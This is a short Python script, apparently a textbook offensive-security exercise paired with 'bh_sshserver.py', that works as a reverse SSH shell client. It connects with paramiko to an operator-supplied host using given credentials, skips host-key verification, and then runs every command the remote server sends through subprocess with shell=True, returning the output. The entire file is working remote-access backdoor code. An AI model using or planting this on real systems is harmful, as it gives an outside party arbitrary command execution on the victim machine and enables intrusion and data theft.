# To be used in pair with bh_sshserver.py

import threading
import paramiko
import subprocess
import sys

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/iluxonchik/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode()) # read banner
        while True:
            command = ssh_session.recv(1024).decode() # get the command from the ssh server
            try:
                # execute the command and send the result back to the client
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()

ssh_command(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])